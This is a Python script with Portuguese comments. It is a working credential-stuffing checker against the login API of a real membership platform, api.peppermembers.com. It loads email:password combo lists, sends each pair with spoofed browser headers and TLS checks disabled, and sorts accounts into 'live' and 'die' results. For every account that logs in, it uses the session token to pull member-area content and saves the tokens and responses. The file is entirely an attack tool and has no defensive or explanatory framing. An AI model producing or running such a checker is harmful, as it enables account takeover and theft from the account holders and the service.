import os
import requests
import urllib3
import json

# Suprimir avisos InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Caminho da pasta com os arquivos de credenciais
directory = 'DB/'
# Caminho da pasta para salvar os resultados
result_directory = 'resultado/'

# Criar a pasta de resultados se não existir
os.makedirs(result_directory, exist_ok=True)

# Listar todos os arquivos txt na pasta
files = [f for f in os.listdir(directory) if f.endswith('.txt')]

# Verificar se há arquivos disponíveis
if not files:
    print("Nenhum arquivo encontrado na pasta DB.")
    exit()

# Listar os arquivos com opções numéricas
print("Selecione um arquivo:")
for i, file in enumerate(files):
    print(f"{i + 1}. {file}")

# Solicitar ao usuário que escolha um arquivo
choice = int(input("\nDigite o número do arquivo que deseja usar: ")) - 1

# Verificar se a escolha é válida
if choice < 0 or choice >= len(files):
    print("Escolha inválida.")
    exit()

# Caminho completo do arquivo escolhido
file_path = os.path.join(directory, files[choice])

# Ler o arquivo escolhido e percorrer as linhas
with open(file_path, 'r') as f:
    lines = f.readlines()

# Percorrer cada linha do arquivo para substituir valores no json_data
for index, line in enumerate(lines):
    # Remover espaços em branco e quebrar a linha pelo delimitador ':'
    email, password = line.strip().split(':')

    # Substituir os valores no json_data
    json_data = {
        'email': email,
        'password': password,
    }

    # Fazer a requisição com os dados substituídos
    response = requests.post(
        'https://api.peppermembers.com/api/user/login', 
        headers={
            'Host': 'api.peppermembers.com',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'accept': 'application/json, text/plain, */*',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-mobile': '?0',
            'authorization': 'Bearer null',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'content-type': 'application/json',
            'origin': 'https://peppermembers.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://peppermembers.com/',
            'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i',
        }, 
        json=json_data, 
        verify=False
    )

    # Exibir o status code e mensagem correspondente com formatação
    status_code = response.status_code
    status_message = "live" if status_code == 200 else "die" if status_code == 401 else f"Outro status: {status_code}"
    
    print(f"\n[#{index + 1}] Email: {email}\nStatus Code: {status_code} - {status_message}")
    print("-" * 40)

    # Caminho do arquivo de resultado com o nome do status code
    result_file = os.path.join(result_directory, f"{status_code}.txt")
    
    # Salvar o email e senha no arquivo correspondente ao status code
    with open(result_file, 'a') as result:
        result.write(f"{email}:{password}\n")

    # Se o status code for 200, realizar a nova requisição usando o token
    if status_code == 200:
        response_data = response.json()
        token = response_data.get('token')
        
        # Cabeçalhos para a nova requisição
        new_headers = {
            'Host': 'api.peppermembers.com',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'accept': 'application/json, text/plain, */*',
            'sec-ch-ua-mobile': '?0',
            'authorization': f'Bearer {token}',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
            'origin': 'https://peppermembers.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://peppermembers.com/',
            'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i',
        }

        # Nova requisição usando o token
        new_response = requests.get(
            'https://api.peppermembers.com/api/memberarea/categories/443', 
            headers=new_headers,
            verify=False
        )

        # Exibir e salvar o resultado da nova requisição
        new_status_code = new_response.status_code
        if new_status_code == 200:
            new_response_data = new_response.json()
            all_categories = new_response_data.get('allCategories', {})
            title = all_categories.get('title', 'N/A')

            # Salvar os detalhes do título e outros dados
            new_result_file = os.path.join(result_directory, '200_details.txt')
            with open(new_result_file, 'a') as new_result:
                new_result.write(f"Email: {email}, Token: {token}, Status: {new_status_code}\n")
                new_result.write(f"Title: {title}\n")
                new_result.write(f"Response: {json.dumps(new_response_data, indent=4)}\n")
                new_result.write("-" * 40 + "\n")
            
            print(f"Nova requisição feita para o email: {email}, Status: {new_status_code}, Title: {title}")
        else:
            print(f"Falha na nova requisição para o email: {email}, Status: {new_status_code}")
